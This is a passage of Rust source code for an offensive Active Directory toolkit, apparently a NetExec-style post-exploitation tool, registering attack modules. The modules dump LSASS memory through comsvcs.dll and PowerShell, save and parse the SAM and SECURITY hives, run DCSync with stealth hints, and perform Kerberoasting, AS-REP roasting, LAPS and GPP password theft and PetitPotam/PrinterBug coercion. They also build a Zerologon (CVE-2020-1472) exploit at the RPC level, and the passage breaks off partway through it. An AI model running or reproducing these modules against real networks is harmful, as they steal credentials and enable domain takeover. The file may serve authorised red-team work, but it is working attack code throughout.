//! CME/NetExec-style extended modules.
//!
//! These modules depend on multiple crates (reaper, hunter, crypto, etc.)
//! and are registered at CLI startup alongside the core execution modules.

use async_trait::async_trait;
use serde_json::Value;
use std::sync::Arc;
use tracing::info;

use overthrone_core::error::{OverthroneError, Result};
use overthrone_core::exec::modules::{ModuleCategory, OvtModule, register_module};
use overthrone_core::exec::{ExecCredentials, ExecOutput};

// ═══════════════════════════════════════════════════════════
// Procdump Module — LSASS dump via comsvcs.dll MiniDump
// ═══════════════════════════════════════════════════════════

pub struct ProcdumpModule;

#[async_trait]
impl OvtModule for ProcdumpModule {
    fn name(&self) -> &'static str {
        "procdump"
    }
    fn description(&self) -> &'static str {
        "Dump LSASS process memory via comsvcs.dll MiniDump"
    }
    fn category(&self) -> ModuleCategory {
        ModuleCategory::Dump
    }

    async fn run(
        &self,
        target: &str,
        creds: ExecCredentials,
        params: Option<Value>,
    ) -> Result<ExecOutput> {
        let dump_path = params
            .as_ref()
            .and_then(|v| v.get("dump_path").and_then(|c| c.as_str()))
            .unwrap_or("C:\\Windows\\Temp\\lsass.dmp");

        let pid = get_lsass_pid_remote(target, &creds).await?;

        let cmd = format!(
            "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {} {} full",
            pid, dump_path
        );

        exec_smb_command(target, &creds, &cmd).await?;

        Ok(ExecOutput {
            stdout: format!(
                "LSASS dump (PID {}) written to {}\nUse SMB get to download for offline parsing",
                pid, dump_path
            ),
            stderr: String::new(),
            exit_code: Some(0),
            method: overthrone_core::exec::ExecMethod::SmbExec,
        })
    }
}

// ═══════════════════════════════════════════════════════════
// Lsassy Module — LSASS dump via PowerShell
// ═══════════════════════════════════════════════════════════

pub struct LsassyModule;

#[async_trait]
impl OvtModule for LsassyModule {
    fn name(&self) -> &'static str {
        "lsassy"
    }
    fn description(&self) -> &'static str {
        "Dump LSASS using PowerShell process dump technique"
    }
    fn category(&self) -> ModuleCategory {
        ModuleCategory::Dump
    }

    async fn run(
        &self,
        target: &str,
        creds: ExecCredentials,
        params: Option<Value>,
    ) -> Result<ExecOutput> {
        let dump_path = params
            .as_ref()
            .and_then(|v| v.get("dump_path").and_then(|c| c.as_str()))
            .unwrap_or("C:\\Windows\\Temp\\lsass.dmp");

        let pid = get_lsass_pid_remote(target, &creds).await?;

        let ps_cmd = format!(
            "powershell.exe -NoP -NonI -Exec Bypass -Command \
             \"$p=Get-Process -Id {0}; \
             [System.IO.File]::WriteAllBytes('{1}', \
             ([System.Diagnostics.Debugger]::SaveDump($p)))\" 2>$null",
            pid, dump_path
        );

        exec_smb_command(target, &creds, &ps_cmd).await?;

        Ok(ExecOutput {
            stdout: format!(
                "LSASS dump via PowerShell (PID {}) written to {}\nUse SMB get to download for offline parsing",
                pid, dump_path
            ),
            stderr: String::new(),
            exit_code: Some(0),
            method: overthrone_core::exec::ExecMethod::SmbExec,
        })
    }
}

// ═══════════════════════════════════════════════════════════
// SAM Dump Module — extract local account hashes
// ═══════════════════════════════════════════════════════════

pub struct SamDumpModule;

#[async_trait]
impl OvtModule for SamDumpModule {
    fn name(&self) -> &'static str {
        "sam-dump"
    }
    fn description(&self) -> &'static str {
        "Dump SAM registry hive and extract local account hashes"
    }
    fn category(&self) -> ModuleCategory {
        ModuleCategory::Dump
    }

    async fn run(
        &self,
        target: &str,
        creds: ExecCredentials,
        _params: Option<Value>,
    ) -> Result<ExecOutput> {
        let save_cmd = "cmd.exe /c reg save HKLM\\SAM C:\\Windows\\Temp\\__sam.hiv >nul 2>&1 & reg save HKLM\\SYSTEM C:\\Windows\\Temp\\__sys.hiv >nul 2>&1";
        exec_smb_command(target, &creds, save_cmd).await?;

        let session = smb_connect(target, &creds).await?;
        let sam_data = session.read_file("C$", "Windows\\Temp\\__sam.hiv").await?;
        let sys_data = session.read_file("C$", "Windows\\Temp\\__sys.hiv").await?;

        let _ = exec_smb_command(
            target,
            &creds,
            "cmd.exe /c del C:\\Windows\\Temp\\__sam.hiv C:\\Windows\\Temp\\__sys.hiv >nul 2>&1",
        )
        .await;

        let creds_out = overthrone_core::proto::secretsdump::dump_sam(&sam_data, &sys_data)
            .map_err(|e| OverthroneError::custom(format!("SAM parse failed: {}", e)))?;

        let mut output = String::new();
        for c in &creds_out {
            let nt = c.nt_hash.as_deref().unwrap_or("<N/A>");
            let lm = c.lm_hash.as_deref().unwrap_or("<N/A>");
            output.push_str(&format!(
                "  {}:{}:{}:{}:::\n",
                c.username,
                c.rid.unwrap_or(0),
                lm,
                nt
            ));
        }

        Ok(ExecOutput {
            stdout: format!("SAM hashes ({} accounts):\n{}", creds_out.len(), output),
            stderr: String::new(),
            exit_code: Some(0),
            method: overthrone_core::exec::ExecMethod::SmbExec,
        })
    }
}

// ═══════════════════════════════════════════════════════════
// LSA Dump Module — extract LSA secrets
// ═══════════════════════════════════════════════════════════

pub struct LsaDumpModule;

#[async_trait]
impl OvtModule for LsaDumpModule {
    fn name(&self) -> &'static str {
        "lsa-dump"
    }
    fn description(&self) -> &'static str {
        "Dump LSA secrets from SECURITY registry hive"
    }
    fn category(&self) -> ModuleCategory {
        ModuleCategory::Dump
    }

    async fn run(
        &self,
        target: &str,
        creds: ExecCredentials,
        _params: Option<Value>,
    ) -> Result<ExecOutput> {
        let save_cmd = "cmd.exe /c reg save HKLM\\SECURITY C:\\Windows\\Temp\\__sec.hiv >nul 2>&1 & reg save HKLM\\SYSTEM C:\\Windows\\Temp\\__sys_lsa.hiv >nul 2>&1";
        exec_smb_command(target, &creds, save_cmd).await?;

        let session = smb_connect(target, &creds).await?;
        let sec_data = session.read_file("C$", "Windows\\Temp\\__sec.hiv").await?;
        let sys_data = session
            .read_file("C$", "Windows\\Temp\\__sys_lsa.hiv")
            .await?;

        let _ = exec_smb_command(target, &creds, "cmd.exe /c del C:\\Windows\\Temp\\__sec.hiv C:\\Windows\\Temp\\__sys_lsa.hiv >nul 2>&1").await;

        let lsa_out = overthrone_core::proto::secretsdump::dump_lsa(&sec_data, &sys_data)
            .map_err(|e| OverthroneError::custom(format!("LSA parse failed: {}", e)))?;

        let mut output = String::new();
        for c in &lsa_out {
            if let Some(ref nt) = c.nt_hash {
                output.push_str(&format!("  {}:NTLM:{}:::\n", c.username, nt));
            }
            if let Some(ref plain) = c.plaintext {
                output.push_str(&format!("  {}:PLAIN:{}\n", c.username, plain));
            }
        }

        Ok(ExecOutput {
            stdout: format!("LSA secrets ({} entries):\n{}", lsa_out.len(), output),
            stderr: String::new(),
            exit_code: Some(0),
            method: overthrone_core::exec::ExecMethod::SmbExec,
        })
    }
}

// ═══════════════════════════════════════════════════════════
// NTDS Dump Module — DCSync via DRSUAPI
// ═══════════════════════════════════════════════════════════

pub struct NtdsDumpModule;

#[async_trait]
impl OvtModule for NtdsDumpModule {
    fn name(&self) -> &'static str {
        "ntds-dump"
    }
    fn description(&self) -> &'static str {
        "DCSync domain secrets via MS-DRSR — single user or full domain replication"
    }
    fn category(&self) -> ModuleCategory {
        ModuleCategory::Dump
    }

    async fn run(
        &self,
        target: &str,
        creds: ExecCredentials,
        params: Option<Value>,
    ) -> Result<ExecOutput> {
        let outfile = params
            .as_ref()
            .and_then(|v| v.get("output").and_then(|c| c.as_str()))
            .unwrap_or("")
            .to_string();

        let dc_host = params
            .as_ref()
            .and_then(|v| v.get("dc").and_then(|c| c.as_str()))
            .unwrap_or(target)
            .to_string();

        let target_user = params
            .as_ref()
            .and_then(|v| v.get("user").and_then(|c| c.as_str()))
            .map(|s| s.to_string());

        let do_all = params
            .as_ref()
            .and_then(|v| v.get("all").and_then(|c| c.as_bool()))
            .unwrap_or(target_user.is_none());

        let build_forge_config = |user: &str| overthrone_forge::runner::ForgeConfig {
            dc_ip: dc_host.clone(),
            domain: creds.domain.clone(),
            username: creds.username.clone(),
            password: if creds.password.is_empty() {
                None
            } else {
                Some(creds.password.clone())
            },
            nt_hash: creds.nt_hash.clone(),
            action: overthrone_forge::runner::ForgeAction::DcSyncUser {
                target_user: user.to_string(),
            },
            krbtgt_hash: None,
            krbtgt_aes256: None,
            service_hash: None,
            domain_sid: None,
            impersonate: None,
            user_rid: 0,
            group_rids: vec![],
            extra_sids: vec![],
            lifetime_hours: 0,
            output_path: None,
            payload_path: None,
            skeleton_master_password: None,
        };

        let mut output = String::new();
        let mut total_secrets = 0usize;

        if do_all {
            let (secrets, _result) =
                overthrone_forge::dcsync_user::dcsync_domain(&build_forge_config("")).await?;
            total_secrets = secrets.len();

            output.push_str(&format!(
                "Domain-wide DCSync: {} secrets from {}\n\n",
                total_secrets, creds.domain
            ));
            for s in &secrets {
                let nt = s.nt_hash.as_deref().unwrap_or("<N/A>");
                let lm = s.lm_hash.as_deref().unwrap_or("<N/A>");
                output.push_str(&format!(
                    "  {}:{}:{}:{}:::\n",
                    s.username, s.user_rid, lm, nt
                ));
                if let Some(ref aes) = s.aes256_key {
                    output.push_str(&format!(
                        "    [+] AES256: {}... ({} chars)\n",
                        &aes[..32.min(aes.len())],
                        aes.len()
                    ));
                }
                if let Some(ref ct) = s.cleartext_password {
                    output.push_str(&format!("    [!] Cleartext: {}\n", ct));
                }
            }
            output.push_str(
                "\nDetected via: Event ID 4662 (Replicating Directory Changes)\n\
                 OPSEC: Full NC sync is noisier than single-object EXOP_REPL_OBJ\n\
                 Hint: use --params '{\"user\":\"krbtgt\"}' for stealth\n",
            );
        } else if let Some(user) = &target_user {
            let result =
                overthrone_forge::dcsync_user::dcsync_single_user(&build_forge_config(user), user)
                    .await?;
            total_secrets = if result.success { 1 } else { 0 };

            output.push_str(&format!("DCSync for user {}: {}\n", user, result.message));
            if let Some(ref pr) = result.persistence_result {
                output.push_str(&format!("{}\n", pr.details));
            }
        }

        if !outfile.is_empty() {
            std::fs::write(&outfile, &output)
                .map_err(|e| OverthroneError::custom(format!("Write failed: {}", e)))?;
        }

        Ok(ExecOutput {
            stdout: format!(
                "NTDS DCSync complete: {} secrets\n{}",
                total_secrets, output
            ),
            stderr: String::new(),
            exit_code: Some(if total_secrets > 0 { 0 } else { 1 }),
            method: overthrone_core::exec::ExecMethod::WinRM,
        })
    }
}

// ═══════════════════════════════════════════════════════════
// BloodHound Module — AD data collection via Reaper
// ═══════════════════════════════════════════════════════════

pub struct BloodHoundModule;

#[async_trait]
impl OvtModule for BloodHoundModule {
    fn name(&self) -> &'static str {
        "bloodhound"
    }
    fn description(&self) -> &'static str {
        "Collect AD data via LDAP and export to BloodHound-compatible JSON"
    }
    fn category(&self) -> ModuleCategory {
        ModuleCategory::Enum
    }

    async fn run(
        &self,
        target: &str,
        creds: ExecCredentials,
        params: Option<Value>,
    ) -> Result<ExecOutput> {
        let outdir = params
            .as_ref()
            .and_then(|v| v.get("outdir").and_then(|c| c.as_str()))
            .unwrap_or("./bloodhound")
            .to_string();
        std::fs::create_dir_all(&outdir).ok();

        let use_ldaps = params
            .as_ref()
            .and_then(|v| v.get("ldaps").and_then(|c| c.as_bool()))
            .unwrap_or(false);

        let page_size = params
            .as_ref()
            .and_then(|v| v.get("page_size").and_then(|c| c.as_u64()))
            .unwrap_or(500) as u32;

        let config = overthrone_reaper::runner::ReaperConfig {
            dc_ip: target.to_string(),
            domain: creds.domain.clone(),
            base_dn: format!("DC={}", creds.domain.replace('.', ",DC=")),
            username: creds.username.clone(),
            password: Some(creds.password.clone()),
            nt_hash: creds.nt_hash.clone(),
            modules: vec![],
            page_size,
            use_ldaps,
        };

        let results = overthrone_reaper::runner::run_reaper(&config).await?;

        let bh_path = std::path::Path::new(&outdir).join("bloodhound.json");
        overthrone_reaper::export::export_results(
            &results,
            &bh_path,
            overthrone_reaper::export::ExportFormat::BloodHoundV4,
        )
        .await?;

        Ok(ExecOutput {
            stdout: format!("BloodHound data exported to {}", bh_path.display()),
            stderr: String::new(),
            exit_code: Some(0),
            method: overthrone_core::exec::ExecMethod::WinRM,
        })
    }
}

// ═══════════════════════════════════════════════════════════
// Kerberoast Module
// ═══════════════════════════════════════════════════════════

pub struct KerberoastModule;

#[async_trait]
impl OvtModule for KerberoastModule {
    fn name(&self) -> &'static str {
        "kerberoast"
    }
    fn description(&self) -> &'static str {
        "Kerberoast — request TGS tickets for service accounts with SPNs"
    }
    fn category(&self) -> ModuleCategory {
        ModuleCategory::Kerberos
    }

    async fn run(
        &self,
        target: &str,
        creds: ExecCredentials,
        params: Option<Value>,
    ) -> Result<ExecOutput> {
        let outdir = params
            .as_ref()
            .and_then(|v| v.get("outdir").and_then(|c| c.as_str()))
            .unwrap_or("./loot")
            .to_string();
        std::fs::create_dir_all(&outdir).ok();

        let outpath = std::path::PathBuf::from(&outdir).join("kerberoast_hashes.txt");

        let hunt_config = overthrone_hunter::runner::HuntConfig {
            dc_ip: target.to_string(),
            domain: creds.domain.clone(),
            username: creds.username.clone(),
            secret: creds.nt_hash.clone().unwrap_or(creds.password.clone()),
            use_hash: creds.nt_hash.is_some(),
            base_dn: None,
            use_ldaps: false,
            output_dir: std::path::PathBuf::from(&outdir),
            concurrency: 5,
            timeout: 30,
            jitter_ms: 0,
            tgt: None,
        };

        let kc = overthrone_hunter::kerberoast::KerberoastConfig {
            target_spns: vec![],
            skip_disabled: true,
            skip_machine_accounts: true,
            target_etypes: vec![
                overthrone_core::crypto::ticket::ETYPE_RC4_HMAC,
                overthrone_core::crypto::ticket::ETYPE_AES256_CTS,
                overthrone_core::crypto::ticket::ETYPE_AES128_CTS,
            ],
            output_file: Some(outpath.clone()),
            admin_only: false,
            downgrade_to_rc4: true,
            spn_filter: None,
        };

        let actions = vec![overthrone_hunter::runner::HuntAction::Kerberoast(kc)];
        let report = overthrone_hunter::runner::run_hunt(&hunt_config, &actions).await?;

        let hash_count = report
            .kerberoast
            .as_ref()
            .map(|r| r.hashes.len())
            .unwrap_or(0);

        Ok(ExecOutput {
            stdout: format!(
                "Kerberoasting complete: {} hashes extracted\nSaved to: {}",
                hash_count,
                outpath.display()
            ),
            stderr: String::new(),
            exit_code: Some(if hash_count > 0 { 0 } else { 1 }),
            method: overthrone_core::exec::ExecMethod::WinRM,
        })
    }
}

// ═══════════════════════════════════════════════════════════
// AS-REP Roast Module
// ═══════════════════════════════════════════════════════════

pub struct AsreproastModule;

#[async_trait]
impl OvtModule for AsreproastModule {
    fn name(&self) -> &'static str {
        "asreproast"
    }
    fn description(&self) -> &'static str {
        "AS-REP roast — request AS-REP for accounts without pre-authentication"
    }
    fn category(&self) -> ModuleCategory {
        ModuleCategory::Kerberos
    }
    fn requires_creds(&self) -> bool {
        false
    }

    async fn run(
        &self,
        target: &str,
        creds: ExecCredentials,
        params: Option<Value>,
    ) -> Result<ExecOutput> {
        let outdir = params
            .as_ref()
            .and_then(|v| v.get("outdir").and_then(|c| c.as_str()))
            .unwrap_or("./loot")
            .to_string();
        std::fs::create_dir_all(&outdir).ok();

        let outpath = std::path::PathBuf::from(&outdir).join("asrep_hashes.txt");

        let domain = params
            .as_ref()
            .and_then(|v| v.get("domain").and_then(|c| c.as_str()))
            .filter(|domain| !domain.trim().is_empty())
            .map(|domain| domain.trim().to_string())
            .or_else(|| {
                if creds.domain.trim().is_empty() {
                    None
                } else {
                    Some(creds.domain.trim().to_string())
                }
            })
            .ok_or_else(|| {
                OverthroneError::custom(
                    "AS-REP roast requires a domain via params.domain or module credentials"
                        .to_string(),
                )
            })?;

        let target_users: Vec<String> = params
            .as_ref()
            .and_then(|v| v.get("target_users"))
            .and_then(|value| value.as_array())
            .map(|items| {
                items
                    .iter()
                    .filter_map(|item| item.as_str().map(|s| s.trim().to_string()))
                    .filter(|s| !s.is_empty())
                    .collect()
            })
            .unwrap_or_default();

        let has_bind_creds = !creds.domain.trim().is_empty()
            && !creds.username.trim().is_empty()
            && (!creds.password.trim().is_empty() || creds.nt_hash.is_some());

        if target_users.is_empty() && !has_bind_creds {
            return Err(OverthroneError::custom(
                "AS-REP roast needs either target_users in params or usable module credentials for LDAP enumeration".to_string(),
            ));
        }

        let hunt_config = overthrone_hunter::runner::HuntConfig {
            dc_ip: target.to_string(),
            domain: domain.clone(),
            username: creds.username.clone(),
            secret: creds.nt_hash.clone().unwrap_or(creds.password.clone()),
            use_hash: creds.nt_hash.is_some(),
            base_dn: None,
            use_ldaps: false,
            output_dir: std::path::PathBuf::from(&outdir),
            concurrency: 5,
            timeout: 30,
            jitter_ms: 0,
            tgt: None,
        };

        let ac = overthrone_hunter::asreproast::AsRepRoastConfig {
            target_users,
            skip_disabled: true,
            output_file: Some(outpath.clone()),
            target_etypes: vec![
                overthrone_core::crypto::ticket::ETYPE_RC4_HMAC,
                overthrone_core::crypto::ticket::ETYPE_AES256_CTS,
                overthrone_core::crypto::ticket::ETYPE_AES128_CTS,
            ],
            target_ous: vec![],
        };

        let actions = vec![overthrone_hunter::runner::HuntAction::AsRepRoast(ac)];
        let report = overthrone_hunter::runner::run_hunt(&hunt_config, &actions).await?;

        let hash_count = report
            .asreproast
            .as_ref()
            .map(|r| r.hashes.len())
            .unwrap_or(0);

        Ok(ExecOutput {
            stdout: format!(
                "AS-REP roasting complete: {} hashes extracted\nSaved to: {}",
                hash_count,
                outpath.display()
            ),
            stderr: String::new(),
            exit_code: Some(if hash_count > 0 { 0 } else { 1 }),
            method: overthrone_core::exec::ExecMethod::WinRM,
        })
    }
}

// ═══════════════════════════════════════════════════════════
// LAPS Module — read LAPS passwords from AD
// ═══════════════════════════════════════════════════════════

pub struct LapsModule;

#[async_trait]
impl OvtModule for LapsModule {
    fn name(&self) -> &'static str {
        "laps"
    }
    fn description(&self) -> &'static str {
        "Read LAPS passwords (v1 plaintext + v2 encrypted) from AD"
    }
    fn category(&self) -> ModuleCategory {
        ModuleCategory::Secrets
    }

    async fn run(
        &self,
        target: &str,
        creds: ExecCredentials,
        _params: Option<Value>,
    ) -> Result<ExecOutput> {
        let config = overthrone_reaper::runner::ReaperConfig {
            dc_ip: target.to_string(),
            domain: creds.domain.clone(),
            base_dn: format!("DC={}", creds.domain.replace('.', ",DC=")),
            username: creds.username.clone(),
            password: Some(creds.password.clone()),
            nt_hash: creds.nt_hash.clone(),
            modules: vec![],
            page_size: 500,
            use_ldaps: false,
        };

        let entries = overthrone_reaper::laps::enumerate_laps(&config).await?;

        let mut output = String::new();
        for e in &entries {
            output.push_str(&format!(
                "  {} | {} | {}\n",
                e.computer_name,
                e.password.as_deref().unwrap_or("N/A"),
                e.expiration.as_deref().unwrap_or("N/A")
            ));
        }

        Ok(ExecOutput {
            stdout: format!("LAPS entries ({} found):\n{}", entries.len(), output),
            stderr: String::new(),
            exit_code: Some(0),
            method: overthrone_core::exec::ExecMethod::WinRM,
        })
    }
}

// ═══════════════════════════════════════════════════════════
// GPP Module — decrypt GPP passwords from SYSVOL
// ═══════════════════════════════════════════════════════════

pub struct GppModule;

#[async_trait]
impl OvtModule for GppModule {
    fn name(&self) -> &'static str {
        "gpp"
    }
    fn description(&self) -> &'static str {
        "Decrypt Group Policy Preferences cpassword from SYSVOL via reaper"
    }
    fn category(&self) -> ModuleCategory {
        ModuleCategory::Secrets
    }

    async fn run(
        &self,
        target: &str,
        creds: ExecCredentials,
        _params: Option<Value>,
    ) -> Result<ExecOutput> {
        let config = overthrone_reaper::runner::ReaperConfig {
            dc_ip: target.to_string(),
            domain: creds.domain.clone(),
            base_dn: format!("DC={}", creds.domain.replace('.', ",DC=")),
            username: creds.username.clone(),
            password: Some(creds.password.clone()),
            nt_hash: creds.nt_hash.clone(),
            modules: vec![],
            page_size: 500,
            use_ldaps: false,
        };

        let result = overthrone_reaper::gpp_fetch::enumerate_gpp_passwords(&config).await?;

        let mut output = String::new();
        for cred in &result.credentials {
            output.push_str(&format!(
                "  {} | {} | {} | {}\n",
                cred.source_file, cred.username, cred.password, cred.changed
            ));
        }

        Ok(ExecOutput {
            stdout: format!(
                "GPP findings ({} found):\n{}",
                result.credentials.len(),
                output
            ),
            stderr: String::new(),
            exit_code: Some(0),
            method: overthrone_core::exec::ExecMethod::SmbExec,
        })
    }
}

// ═══════════════════════════════════════════════════════════
// Coerce Module — auth coercion
// ═══════════════════════════════════════════════════════════

pub struct CoerceModule;

#[async_trait]
impl OvtModule for CoerceModule {
    fn name(&self) -> &'static str {
        "coerce"
    }
    fn description(&self) -> &'static str {
        "Auth coercion — trigger machine authentication via MS-EFSRPC / MS-RPRN"
    }
    fn category(&self) -> ModuleCategory {
        ModuleCategory::Coerce
    }

    async fn run(
        &self,
        target: &str,
        creds: ExecCredentials,
        params: Option<Value>,
    ) -> Result<ExecOutput> {
        let listener = params
            .as_ref()
            .and_then(|v| v.get("listener").and_then(|c| c.as_str()))
            .ok_or_else(|| {
                OverthroneError::custom("'listener' parameter required (IP to receive auth)")
            })?
            .to_string();

        let technique = params
            .as_ref()
            .and_then(|v| v.get("technique").and_then(|c| c.as_str()))
            .unwrap_or("petitpotam")
            .to_string();

        let hunt_config = overthrone_hunter::runner::HuntConfig {
            dc_ip: target.to_string(),
            domain: creds.domain.clone(),
            username: creds.username.clone(),
            secret: creds.nt_hash.clone().unwrap_or(creds.password.clone()),
            use_hash: creds.nt_hash.is_some(),
            base_dn: None,
            use_ldaps: false,
            output_dir: std::path::PathBuf::from("./loot"),
            concurrency: 1,
            timeout: 30,
            jitter_ms: 0,
            tgt: None,
        };

        let cc = overthrone_hunter::coerce::CoerceConfig {
            target: target.to_string(),
            listener,
            listener_port: 445,
            methods: vec![match technique.to_lowercase().as_str() {
                "petitpotam" => overthrone_hunter::coerce::CoerceMethod::PetitPotam,
                "printerbug" => overthrone_hunter::coerce::CoerceMethod::PrinterBug,
                "dfscoerce" => overthrone_hunter::coerce::CoerceMethod::DfsCoerce,
                _ => {
                    return Err(OverthroneError::custom(format!(
                        "Unknown technique: {}. Options: petitpotam, printerbug, dfscoerce",
                        technique
                    )));
                }
            }],
            listener_path: None,
            mssql_port: 1433,
        };

        let result = overthrone_hunter::coerce::run(&hunt_config, &cc).await?;

        let mut output = format!("Coercion ({}) sent to {}:\n", technique, target);
        for attempt in &result.successful_coercions {
            output.push_str(&format!(
                "  ✓ {} via {}: success\n",
                attempt.method, attempt.pipe
            ));
        }
        for attempt in &result.failed_coercions {
            output.push_str(&format!(
                "  ✗ {} via {}: {}\n",
                attempt.method,
                attempt.pipe,
                attempt.error.as_deref().unwrap_or("unknown error")
            ));
        }

        Ok(ExecOutput {
            stdout: output,
            stderr: String::new(),
            exit_code: Some(if !result.successful_coercions.is_empty() {
                0
            } else {
                1
            }),
            method: overthrone_core::exec::ExecMethod::WinRM,
        })
    }
}

// ═══════════════════════════════════════════════════════════
// Nslookup Module — DNS resolution
// ═══════════════════════════════════════════════════════════

pub struct NslookupModule;

#[async_trait]
impl OvtModule for NslookupModule {
    fn name(&self) -> &'static str {
        "nslookup"
    }
    fn description(&self) -> &'static str {
        "DNS lookup — resolve hostnames via DNS SRV records"
    }
    fn category(&self) -> ModuleCategory {
        ModuleCategory::Scan
    }
    fn requires_creds(&self) -> bool {
        false
    }

    async fn run(
        &self,
        target: &str,
        _creds: ExecCredentials,
        params: Option<Value>,
    ) -> Result<ExecOutput> {
        let query_name = params
            .as_ref()
            .and_then(|v| v.get("name").and_then(|c| c.as_str()))
            .unwrap_or(target);

        match overthrone_core::proto::dns::resolve_hostname(query_name).await {
            Ok(records) => {
                let mut out = format!("DNS resolution for {}:\n", query_name);
                for r in records {
                    out.push_str(&format!("  {}\n", r));
                }
                Ok(ExecOutput {
                    stdout: out,
                    stderr: String::new(),
                    exit_code: Some(0),
                    method: overthrone_core::exec::ExecMethod::WinRM,
                })
            }
            Err(e) => {
                // Try DC discovery as fallback
                match overthrone_core::proto::dns::discover_domain_controllers(query_name).await {
                    Ok(dcs) => {
                        let mut out = format!("Domain controllers for {}:\n", query_name);
                        for (dc, addrs) in &dcs {
                            out.push_str(&format!("  {}: {}\n", dc, addrs.join(", ")));
                        }
                        Ok(ExecOutput {
                            stdout: out,
                            stderr: String::new(),
                            exit_code: Some(0),
                            method: overthrone_core::exec::ExecMethod::WinRM,
                        })
                    }
                    Err(_) => Err(OverthroneError::custom(format!("DNS lookup failed: {}", e))),
                }
            }
        }
    }
}

// ═══════════════════════════════════════════════════════════
// Zerologon Module — CVE-2020-1472 Netlogon privilege escalation
// ═══════════════════════════════════════════════════════════

const NETLOGON_UUID: [u8; 16] = [
    0x78, 0x56, 0x34, 0x12, 0x34, 0x12, 0xCD, 0xAB, 0xEF, 0x00, 0x01, 0x23, 0x45, 0x67, 0xCF, 0xFB,
];
const NDR_SYNTAX_UUID_ZERO: [u8; 16] = [
    0x04, 0x5d, 0x88, 0x8a, 0xeb, 0x1c, 0xc9, 0x11, 0x9f, 0xe8, 0x08, 0x00, 0x2b, 0x10, 0x48, 0x60,
];

static ZERO_CALL_ID: std::sync::atomic::AtomicU32 = std::sync::atomic::AtomicU32::new(1);
fn zero_next_call_id() -> u32 {
    ZERO_CALL_ID.fetch_add(1, std::sync::atomic::Ordering::Relaxed)
}

fn build_netlogon_rpc_bind() -> Vec<u8> {
    let mut pdu = Vec::with_capacity(72);
    let call_id = zero_next_call_id();
    pdu.push(5);
    pdu.push(0);
    pdu.push(11);
    pdu.push(0x03);
    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]);
    pdu.extend_from_slice(&[0x00, 0x00]);
    pdu.extend_from_slice(&[0x00, 0x00]);
    pdu.extend_from_slice(&call_id.to_le_bytes());
    pdu.extend_from_slice(&4096u16.to_le_bytes());
    pdu.extend_from_slice(&4096u16.to_le_bytes());
    pdu.extend_from_slice(&0u32.to_le_bytes());
    pdu.push(1);
    pdu.push(0);
    pdu.extend_from_slice(&[0x00, 0x00]);
    pdu.extend_from_slice(&0u16.to_le_bytes());
    pdu.push(1);
    pdu.push(0);
    pdu.extend_from_slice(&NETLOGON_UUID);
    pdu.extend_from_slice(&1u16.to_le_bytes()); // ver_major
    pdu.extend_from_slice(&0u16.to_le_bytes()); // ver_minor
    pdu.extend_from_slice(&NDR_SYNTAX_UUID_ZERO);
    pdu.extend_from_slice(&2u32.to_le_bytes());
    let len = pdu.len() as u16;
    pdu[8] = (len & 0xFF) as u8;
    pdu[9] = (len >> 8) as u8;
    pdu
}

fn build_netlogon_rpc_request(opnum: u16, stub: &[u8]) -> Vec<u8> {
    let frag_len = (24 + stub.len()) as u16;
    let call_id = zero_next_call_id();
    let mut pdu = Vec::with_capacity(frag_len as usize);
    pdu.push(5);
    pdu.push(0);
    pdu.push(0);
    pdu.push(0x03);
    pdu.extend_from_slice(&[0x10, 0x00, 0x00, 0x00]);
    pdu.extend_from_slice(&frag_len.to_le_bytes());
    pdu.extend_from_slice(&0u16.to_le_bytes());
    pdu.extend_from_slice(&call_id.to_le_bytes());
    pdu.extend_from_slice(&(stub.len() as u32).to_le_bytes());
    pdu.extend_from_slice(&0u16.to_le_bytes());
    pdu.extend_from_slice(&opnum.to_le_bytes());
    pdu.extend_from_slice(stub);
    pdu
}

fn encode_ndr_unique_string(s: &str) -> Vec<u8> {
    let utf16: Vec<u8> = s
        .encode_utf16()
        .chain(std::iter::once(0u16))
        .flat_map(|c| c.to_le_bytes())
        .collect();
    let count = (s.len() as u32) + 1;
    let mut buf = Vec::new();
    buf.extend_from_slice(&1u32.to_le_bytes());
    buf.extend_from_slice(&count.to_le_bytes());
    buf.extend_from_slice(&0u32.to_le_bytes());
    buf.extend_from_slice(&count.to_le_bytes());
    buf.extend_from_slice(&utf16);
    while buf.len() % 4 != 0 {
        buf.push(0);
    }
    buf
}

fn build_netr_server_req_challenge(server: &str, computer: &str) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(&encode_ndr_unique_string(server));
    stub.extend_from_slice(&encode_ndr_unique_string(computer));
    stub.extend_from_slice(&[0u8; 16]);
    build_netlogon_rpc_request(4, &stub)
}

fn build_netr_server_authenticate3(server: &str, account: &str, computer: &str) -> Vec<u8> {
    let mut stub = Vec::new();
    stub.extend_from_slice(&encode_ndr_unique_string(server));
    stub.extend_from_slice(&encode_ndr_unique_string(account));
    stub.extend_from_slice(&2u16.to_le_bytes()); // SecureChannelType = Workstation (2)
    stub.extend_from_slice(&0u16.to_le_bytes()); // padding
    stub.extend_from_slice(&encode_ndr_unique_string(computer));
    stub.extend_from_slice(&[0u8; 8]); // zero client credential
    stub.extend_from_slice(&1u32.to_le_bytes()); // NegotiateFlags pointer (non-null out)
    stub.extend_from_slice(&0x20FFFFFFu32.to_le_bytes()); // flags in
    stub.extend_from_slice(&1u32.to_le_bytes()); // AccountRid pointer (non-null out)
    stub.extend_from_slice(&0u32.to_le_bytes()); // rid placeholder
    stub.extend_from_slice(&1u32.to_le_bytes()); // ErrorCode pointer (non-null out)
    stub.extend_from_slice(&0u32.to_le_bytes()); // error placeholder
    build_netlogon_rpc_request(26, &stub)
}

fn validate_rpc_bind_ack_netlogon(resp: &[u8]) -> Result<()> {
    if resp.len() < 24 || resp[2] != 12 {
        return Err(OverthroneError::custom(
            "RPC bind to NETLOGON rejected (DC may have CVE-2020-1472 patched or no NETLOGON pipe)",
        ));
    }
    Ok(())
}

fn parse_auth3_response(resp: &[u8]) -> Result<u32> {
    if resp.len() < 68 {
        // minimum expected with all out params
        return Err(OverthroneError::custom(
            "NetrServerAuthenticate3 response too short",
        ));
    }
    let stub_start = 24; // skip RPC header
    if stub_start + 36 > resp.len() {
        return Err(OverthroneError::custom(
            "Insufficient stub data in auth3 response",
        ));
    }
    // Navigate NDR: skip ServerCredential (8 bytes), pad, negotiate flags in/out,
    // accountRid, then error code
    let error_offset = stub_start + 28;
    if error_offset + 4 > resp.len() {
        return Err(OverthroneError::custom(
            "Cannot read error code from auth3 response",
        ));
    }
    let error_code = u32::from_le_bytes([
        resp[error_offset],
        resp[error_offset + 1],
